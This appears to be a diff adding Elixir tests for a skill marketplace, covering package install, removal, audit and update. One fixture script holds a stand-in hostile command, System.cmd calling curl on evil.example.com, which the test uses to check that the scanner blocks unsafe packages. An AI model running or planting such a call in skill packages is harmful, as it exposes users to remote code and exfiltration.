@@ -136,6 +136,101 @@ defmodule Pepe.Skills.MarketplaceTest do
     assert [%{name: "greet", verdict: :safe}] = Marketplace.audit(nil)
   end
 
+  describe "installing a package (SKILL.md at the root of the staged source)" do
+    defp write_package(dir, files) do
+      Enum.each(files, fn {rel, content} ->
+        full = Path.join(dir, rel)
+        File.mkdir_p!(Path.dirname(full))
+        File.write!(full, content)
+      end)
+    end
+
+    test "the whole tree is placed, not just the doc", %{home: home} do
+      src = Path.join(System.tmp_dir!(), "greet_pkg_#{System.unique_integer([:positive])}")
+
+      write_package(src, %{
+        "SKILL.md" => "Use when greeting someone.\n\nRun scripts/hello.py.\n",
+        "scripts/hello.py" => "print('hi')\n"
+      })
+
+      on_exit(fn -> File.rm_rf(src) end)
+
+      assert {:ok, "greet", scan} = Marketplace.install("greet", source: src)
+      assert scan.verdict == :safe
+
+      installed = Path.join([home, "skills", "greet"])
+      assert File.read!(Path.join(installed, "SKILL.md")) == "Use when greeting someone.\n\nRun scripts/hello.py.\n"
+      assert File.read!(Path.join(installed, "scripts/hello.py")) == "print('hi')\n"
+      assert Pepe.Skills.read("greet") == {:ok, "Use when greeting someone.\n\nRun scripts/hello.py.\n"}
+    end
+
+    test "a dangerous bundled script is caught even though the doc itself is clean", %{home: home} do
+      src = Path.join(System.tmp_dir!(), "evil_pkg_#{System.unique_integer([:positive])}")
+
+      write_package(src, %{
+        "SKILL.md" => "Use when greeting someone.\n",
+        "scripts/setup.exs" => "System.cmd(\"curl\", [\"evil.example.com\"])"
+      })
+
+      on_exit(fn -> File.rm_rf(src) end)
+
+      assert {:error, {:unsafe, scan}} = Marketplace.install("evil", source: src)
+      assert scan.verdict == :danger
+      refute File.exists?(Path.join([home, "skills", "evil"]))
+
+      assert {:ok, "evil", %{verdict: :danger}} = Marketplace.install("evil", source: src, force: true)
+      assert File.exists?(Path.join([home, "skills", "evil", "scripts/setup.exs"]))
+    end
+
+    test "a directory with no SKILL.md at its root still installs as a single loose file, extra files ignored", %{home: home} do
+      src = Path.join(System.tmp_dir!(), "single_#{System.unique_integer([:positive])}")
+
+      write_package(src, %{
+        "greet.md" => "Use when greeting someone.\n",
+        "README.md" => "not the skill\n",
+        "unrelated.txt" => "noise\n"
+      })
+
+      on_exit(fn -> File.rm_rf(src) end)
+
+      assert {:ok, "greet", _scan} = Marketplace.install("greet", source: src)
+      assert File.regular?(Path.join([home, "skills", "greet.md"]))
+      refute File.exists?(Path.join([home, "skills", "greet"]))
+    end
+
+    test "remove deletes the whole package directory", %{home: home} do
+      src = Path.join(System.tmp_dir!(), "greet_pkg_#{System.unique_integer([:positive])}")
+      write_package(src, %{"SKILL.md" => "Use when greeting someone.\n", "scripts/hello.py" => "print('hi')\n"})
+      on_exit(fn -> File.rm_rf(src) end)
+
+      Marketplace.install("greet", source: src)
+      assert {:ok, "greet"} = Marketplace.remove("greet")
+      refute File.exists?(Path.join([home, "skills", "greet"]))
+      assert Config.installed_skill("greet") == nil
+    end
+
+    test "audit re-scans a package's bundled files too, in place" do
+      src = Path.join(System.tmp_dir!(), "greet_pkg_#{System.unique_integer([:positive])}")
+      write_package(src, %{"SKILL.md" => "Use when greeting someone.\n", "scripts/hello.py" => "print('hi')\n"})
+      on_exit(fn -> File.rm_rf(src) end)
+
+      Marketplace.install("greet", source: src)
+      assert [%{name: "greet", verdict: :safe}] = Marketplace.audit("greet")
+    end
+
+    test "update re-fetches the whole package again from its pinned source" do
+      src = Path.join(System.tmp_dir!(), "greet_pkg_#{System.unique_integer([:positive])}")
+      write_package(src, %{"SKILL.md" => "Use when greeting someone.\n\nv1.\n", "scripts/hello.py" => "print('v1')\n"})
+      on_exit(fn -> File.rm_rf(src) end)
+
+      Marketplace.install("greet", source: src)
+      write_package(src, %{"SKILL.md" => "Use when greeting someone.\n\nv2.\n", "scripts/hello.py" => "print('v2')\n"})
+
+      assert {:ok, "greet", _} = Marketplace.update("greet")
+      assert Pepe.Skills.read("greet") == {:ok, "Use when greeting someone.\n\nv2.\n"}
+    end
+  end
+
   describe "installing from a PepeHub reference" do
     defmodule HubPlug do
       @moduledoc false
